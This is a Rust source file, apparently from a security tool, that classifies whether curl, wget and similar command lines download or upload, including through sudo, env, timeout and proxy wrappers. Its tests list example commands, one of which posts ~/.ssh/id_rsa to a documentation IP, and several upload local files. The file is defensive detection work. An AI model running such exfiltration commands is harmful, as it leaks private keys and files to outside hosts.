//! Native HTTP direction for action findings: whether one tokenized command
//! segment downloads or uploads. This classifies command text, not observed
//! network activity. Hostnames are never resolved; only a parsed literal
//! loopback IP is exempt from download.
//!
//! Session Rule v1 content keeps its own self-describing YAML predicates. This
//! parser is the higher-precision native profile and is not a public API.

use std::net::IpAddr;

/// Download clients, by normalized command word.
const DOWNLOAD_CLIENTS: [&str; 6] = [
    "curl",
    "wget",
    "aria2c",
    "invoke-webrequest",
    "iwr",
    "fetch",
];

/// curl short options that take a value, attached or in the next token.
const CURL_VALUE_FLAGS: &str = "AbcCdDeEFHKmoPQrtTuUwxXyYz";

/// Wrappers that run their operand as the command: the short options that
/// take a value, and whether one positional (a `timeout` duration) precedes
/// the command.
const WRAPPERS: [(&str, &str, bool); 15] = [
    ("sudo", "ugCDhprtTU", false),
    ("doas", "uC", false),
    ("env", "uCS", false),
    ("xargs", "adEILnPs", false),
    ("timeout", "sk", true),
    ("nice", "n", false),
    ("ionice", "cnp", false),
    ("stdbuf", "ioe", false),
    ("time", "fo", false),
    ("nohup", "", false),
    ("command", "", false),
    ("exec", "a", false),
    ("torsocks", "", false),
    ("proxychains", "f", false),
    ("proxychains4", "f", false),
];

/// Wrapper long options that take a separate value (`--user deploy`).
const WRAPPER_VALUE_OPTIONS: [&str; 19] = [
    "user",
    "group",
    "host",
    "prompt",
    "chdir",
    "role",
    "type",
    "other-user",
    "unset",
    "split-string",
    "arg-file",
    "delimiter",
    "eof",
    "replace",
    "max-args",
    "max-procs",
    "signal",
    "kill-after",
    "adjustment",
];

/// A leading `NAME=value` shell assignment.
pub(crate) fn assignment(token: &str) -> bool {
    token.split_once('=').is_some_and(|(name, _)| {
        name.starts_with(|c: char| c == '_' || c.is_ascii_alphabetic())
            && name.chars().all(|c| c == '_' || c.is_ascii_alphanumeric())
    })
}

/// The client invocation of a command segment: its command word, after any
/// leading assignments and wrappers such as `sudo -u user`, `env A=1`,
/// `xargs -n1` or `timeout 30`. A client named as an argument (`git fetch`,
/// `echo curl`, `which wget`) is not an invocation.
fn invocation<'a>(tokens: &'a [String], clients: &[&str]) -> Option<&'a [String]> {
    let mut index = 0;
    while let Some(token) = tokens.get(index) {
        let name = client_name(token);
        if clients.contains(&name.as_str()) {
            return Some(&tokens[index..]);
        }
        if assignment(token) {
            index += 1;
            continue;
        }
        let (_, values, positional) = WRAPPERS.iter().find(|(wrapper, ..)| *wrapper == name)?;
        index += 1;
        while let Some(option) = tokens
            .get(index)
            .filter(|token| token.len() > 1 && token.starts_with('-'))
        {
            index += 1;
            if option == "--" {
                break;
            }
            // A value-taking option without an attached value takes the next
            // token: `--user deploy`, `-u deploy`, or a cluster ending in a
            // value-taking letter (`-iu deploy`, but not `-uroot`).
            let takes_next = match option.strip_prefix("--") {
                Some(long) => WRAPPER_VALUE_OPTIONS.contains(&long),
                None => option[1..]
                    .char_indices()
                    .find(|(_, letter)| values.contains(*letter))
                    .is_some_and(|(offset, _)| offset + 1 == option.len() - 1),
            };
            index += usize::from(takes_next);
        }
        index += usize::from(*positional);
    }
    None
}

/// The normalized command word: basename, lowercase, no `.exe`, and the
/// command of an `X=$(command` assignment.
pub(crate) fn client_name(token: &str) -> String {
    let token = token
        .split_once("=$(")
        .map_or(token, |(_, command)| command);
    let name = token
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(token)
        .to_ascii_lowercase();
    match name.strip_suffix(".exe") {
        Some(stem) => stem.to_owned(),
        None => name,
    }
}

/// The segment's client invocation, if it downloads.
pub(crate) fn download_candidate(tokens: &[String]) -> Option<&[String]> {
    invocation(tokens, &DOWNLOAD_CLIENTS).filter(|command| {
        let request = request(command);
        request.url_seen && (request.non_loopback || request.rerouted) && !request.upload
    })
}

/// Whether the segment's client is a Windows program (`curl.exe`) or a
/// PowerShell cmdlet, whose shell keeps a backslash as text.
pub(crate) fn windows_client(tokens: &[String]) -> bool {
    invocation(tokens, &DOWNLOAD_CLIENTS).is_some_and(|command| {
        command[0].to_ascii_lowercase().ends_with(".exe")
            || matches!(
                client_name(&command[0]).as_str(),
                "invoke-webrequest" | "iwr"
            )
    })
}

/// Whether the segment's curl or wget invocation uploads.
pub(crate) fn is_upload(tokens: &[String]) -> bool {
    invocation(tokens, &["curl", "wget"]).is_some_and(|command| request(command).upload)
}

#[derive(Default)]
struct Request {
    upload: bool,
    url_seen: bool,
    non_loopback: bool,
    rerouted: bool,
}

impl Request {
    fn url(&mut self, token: &str) {
        let Some((scheme, rest)) = token.split_once("://") else {
            return;
        };
        // A `)` or backtick closes a command substitution around the URL.
        let authority = rest
            .split(['/', '?', '#', ')', '`'])
            .next()
            .unwrap_or_default();
        if ["http", "https", "ftp"]
            .iter()
            .any(|allowed| scheme.eq_ignore_ascii_case(allowed))
            && !authority.is_empty()
            && !authority
                .chars()
                .any(|ch| ch.is_whitespace() || matches!(ch, '|' | ';' | '&' | '"' | '\'' | '\\'))
        {
            self.url_seen = true;
            self.non_loopback |= !literal_loopback(authority);
        }
    }
}

/// Whether a URL authority names a literal loopback IP: 127.0.0.0/8, `::1`
/// in any textual form, or IPv4-mapped 127.0.0.0/8. `localhost` is a name.
fn literal_loopback(authority: &str) -> bool {
    let host_port = authority.rsplit('@').next().unwrap_or_default();
    let host = if let Some(bracketed) = host_port.strip_prefix('[') {
        let Some((host, suffix)) = bracketed.split_once(']') else {
            return false;
        };
        if !suffix.is_empty()
            && !suffix
                .strip_prefix(':')
                .is_some_and(|port| port.parse::<u16>().is_ok())
        {
            return false;
        }
        host
    } else {
        let (host, port) = host_port.split_once(':').unwrap_or((host_port, ""));
        if !port.is_empty() && port.parse::<u16>().is_err() {
            return false;
        }
        host
    };
    match host.parse::<IpAddr>() {
        Ok(IpAddr::V4(ip)) => ip.is_loopback(),
        Ok(IpAddr::V6(ip)) => {
            ip.is_loopback() || ip.to_ipv4_mapped().is_some_and(|ip| ip.is_loopback())
        }
        Err(_) => false,
    }
}

/// curl request data: `@file` (and `name@file` for `--data-urlencode`) is
/// read from a file; `--data-raw` never is.
fn file_data(flag: &str, value: &str) -> bool {
    match flag {
        "data-raw" => false,
        "data-urlencode" => value
            .split_once('=')
            .map_or(value, |(name, _)| name)
            .contains('@'),
        _ => value.starts_with('@'),
    }
}

fn upload_method(method: &str) -> bool {
    method.eq_ignore_ascii_case("POST") || method.eq_ignore_ascii_case("PUT")
}

/// Parses one client invocation: `tokens[0]` is the client.
fn request(tokens: &[String]) -> Request {
    let client = client_name(&tokens[0]);
    let (curl, wget) = (client == "curl", client == "wget");
    let mut get = false;
    let mut data = false;
    let mut file = false;
    let mut request = Request::default();
    let mut rest = tokens.iter().skip(1);
    while let Some(token) = rest.next() {
        if token == "--" {
            rest.by_ref().for_each(|token| request.url(token));
            break;
        }
        if let Some(long) = token.strip_prefix("--") {
            let (flag, attached) = long
                .split_once('=')
                .map_or((long, None), |(flag, value)| (flag, Some(value)));
            let mut value = || {
                attached
                    .or_else(|| rest.next().map(String::as_str))
                    .unwrap_or_default()
            };
            match flag {
                "get" if curl => get = true,
                "request" if curl => request.upload |= upload_method(value()),
                "method" if wget => request.upload |= upload_method(value()),
                "data" | "data-ascii" | "data-binary" | "data-raw" | "data-urlencode" | "json"
                    if curl =>
                {
                    data = true;
                    file |= file_data(flag, value());
                }
                "form" | "form-string" | "upload-file" if curl => {
                    value();
                    request.upload = true;
                }
                // wget accepts unambiguous abbreviations such as `--post-f`.
                _ if wget && (flag.starts_with("post-") || flag.starts_with("body-")) => {
                    value();
                    request.upload = true;
                }
                "proxy" | "preproxy" | "proxy1.0" | "socks4" | "socks4a" | "socks5"
                | "socks5-hostname" | "connect-to" | "resolve"
                    if curl =>
                {
                    value();
                    request.rerouted = true;
                }
                "url" if curl => request.url(value()),
                "header" | "user-agent" | "referer" | "output" | "dump-header" | "cookie"
                | "user" | "config"
                    if curl =>
                {
                    value();
                }
                _ => {}
            }
        } else if let Some(short) = token.strip_prefix('-').filter(|_| curl) {
            for (offset, flag) in short.char_indices() {
                if flag == 'G' {
                    get = true;
                }
                if !CURL_VALUE_FLAGS.contains(flag) {
                    continue;
                }
                let tail = &short[offset + flag.len_utf8()..];
                let value = if tail.is_empty() {
                    rest.next().map(String::as_str).unwrap_or_default()
                } else {
                    tail
                };
                match flag {
                    'X' => request.upload |= upload_method(value),
                    'd' => {
                        data = true;
                        file |= file_data("data", value);
                    }
                    'F' | 'T' => request.upload = true,
                    'x' => request.rerouted = true,
                    _ => {}
                }
                break;
            }
        } else if !token.starts_with('-') {
            request.url(token);
        }
    }
    // `-G` sends data as a query, except data read from a file.
    request.upload |= data && (!get || file);
    request
}

#[cfg(test)]
mod tests {
    use super::{download_candidate, is_upload};

    fn tokens(command: &str) -> Vec<String> {
        crate::process_chain::tokenize(command)
    }

    #[test]
    fn direction_follows_each_client_invocation() {
        for (command, download, upload) in [
            // The invocation follows leading assignments and wrappers.
            (
                "env NOTE=curl- curl -d @~/.ssh/id_rsa https://203.0.113.10/",
                false,
                true,
            ),
            ("sudo -u deploy curl https://203.0.113.10/a", true, false),
            ("sudo -E curl -d @f https://203.0.113.10/", false, true),
            (
                "env -i PATH=/usr/bin curl https://203.0.113.10/a",
                true,
                false,
            ),
            (
                "timeout -s KILL 30s curl https://203.0.113.10/a",
                true,
                false,
            ),
            ("nice -n 10 wget https://203.0.113.10/a", true, false),
            (
                "xargs -n1 -I{} curl -d @{} https://203.0.113.10/",
                false,
                true,
            ),
            ("SYNTHETIC=1 curl https://203.0.113.10/a", true, false),
            (
                "sudo --user deploy curl -d @f https://203.0.113.10/",
                false,
                true,
            ),
            ("sudo -iu deploy curl https://203.0.113.10/a", true, false),
            ("sudo -uroot curl https://203.0.113.10/a", true, false),
            ("sudo -- curl https://203.0.113.10/a", true, false),
            (
                "timeout --signal KILL 30 curl https://203.0.113.10/a",
                true,
                false,
            ),
            (
                "sudo env A=1 timeout 5 curl https://203.0.113.10/a",
                true,
                false,
            ),
            ("sudo", false, false),
            // A client named as an argument is not an invocation.
            ("git fetch https://203.0.113.10/repo.git main", false, false),
            ("echo curl https://203.0.113.10/a", false, false),
            ("which curl wget https://203.0.113.10/a", false, false),
            ("rg -n curl -d src https://203.0.113.10/", false, false),
            ("sudo curl https://203.0.113.10/a", true, false),
            ("xargs curl -d @- https://203.0.113.10/", false, true),
            ("curl.exe -F f=@x https://203.0.113.10/", false, true),
            // curl's short-flag table applies only to curl.
            ("aria2c -d downloads https://203.0.113.10/a", true, false),
            ("wget -d https://203.0.113.10/a", true, false),
            ("wget -x https://203.0.113.10/a", true, false),
            ("wget -H https://203.0.113.10/a", true, false),
            ("wget -T 10 https://203.0.113.10/a", true, false),
            ("wget --post-file=f https://203.0.113.10/", false, true),
            (
                "wget --method=PUT --body-file=f https://203.0.113.10/",
                false,
                true,
            ),
            // Clustered, case-sensitive curl flags.
            ("curl -sX POST https://203.0.113.10/", false, true),
            ("curl -sXPUT https://203.0.113.10/", false, true),
            ("curl -sf https://203.0.113.10/a", true, false),
            ("curl -sD headers https://203.0.113.10/a", true, false),
            ("curl -odata.bin https://203.0.113.10/a", true, false),
            ("curl --data-ascii x https://203.0.113.10/", false, true),
            ("curl --json @f https://203.0.113.10/", false, true),
            // -G data is a query unless it is read from a file.
            (
                "curl -G --data-urlencode q=x https://203.0.113.10/s",
                true,
                false,
            ),
            (
                "curl -G --data-urlencode d@file https://203.0.113.10/s",
                false,
                true,
            ),
            (
                "curl -G --data-urlencode @file https://203.0.113.10/s",
                false,
                true,
            ),
            (
                "curl -G --data-urlencode q=a@b https://203.0.113.10/s",
                true,
                false,
            ),
            ("curl -sGd q=x https://203.0.113.10/s", true, false),
            ("curl --get -d @file https://203.0.113.10/s", false, true),
            (
                "curl -G --data-raw @literal https://203.0.113.10/s",
                true,
                false,
            ),
            ("curl -G -X POST -d q=x https://203.0.113.10/s", false, true),
            ("curl -G -T f https://203.0.113.10/s", false, true),
            // Proxies, including SOCKS, are reroutes; their arguments are not
            // target URLs.
            (
                "curl --socks5 proxy.example.invalid:1080 http://127.0.0.1/a",
                true,
                false,
            ),
            (
                "curl --socks5-hostname proxy.example.invalid:1080 http://127.0.0.1/a",
                true,
                false,
            ),
            (
                "curl --socks4a proxy.example.invalid:1080 http://127.0.0.1/a",
                true,
                false,
            ),
            (
                "curl --proxy1.0 proxy.example.invalid:8080 http://127.0.0.1/a",
                true,
                false,
            ),
            ("curl -x http://203.0.113.10:8080", false, false),
            ("curl --proxy=http://203.0.113.10:8080", false, false),
            (
                "curl -x http://203.0.113.10:8080 http://127.0.0.1/a",
                true,
                false,
            ),
            (
                "curl -e https://203.0.113.10/ http://127.0.0.1/a",
                false,
                false,
            ),
            // Literal loopback in every textual form; names are not exempt.
            ("curl 'http://[0:0:0:0:0:0:0:1]/a'", false, false),
            ("curl 'http://[::0001]:8080/a'", false, false),
            ("curl 'http://[0:0:0:0:0:ffff:7f00:1]/a'", false, false),
            ("curl http://user:synthetic@127.0.0.1:8080/a", false, false),
            ("curl http://localhost/a", true, false),
            ("curl http://127.0.0.1:notaport/a", true, false),
            ("X=$(curl -s http://127.0.0.1)", false, false),
            ("X=$(curl -s http://203.0.113.10)", true, false),
            ("wget --post-f=f https://203.0.113.10/", false, true),
            (
                "wget --body-d=x --meth=PUT https://203.0.113.10/",
                false,
                true,
            ),
            ("curl -d @f http://127.0.0.1/a", false, true),
        ] {
            let tokens = tokens(command);
            assert_eq!(download_candidate(&tokens).is_some(), download, "{command}");
            assert_eq!(is_upload(&tokens), upload, "{command}");
        }
    }
}
